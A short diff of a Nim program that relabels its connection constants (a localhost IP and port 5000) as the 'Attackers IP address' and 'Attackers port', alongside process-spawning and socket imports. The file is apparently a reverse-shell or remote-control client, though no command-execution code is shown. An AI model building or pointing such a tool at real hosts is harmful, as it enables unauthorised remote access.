@@ -9,8 +9,8 @@ import strutils
 import osproc, streams
 
 const
-  SERVER_IP = "127.0.0.1"   # Change to server IP
-  SERVER_PORT = Port(5000)
+  SERVER_IP = "127.0.0.1"   # Attackers IP address
+  SERVER_PORT = Port(5000)   # Attackers port
 
 var
   client = newSocket()
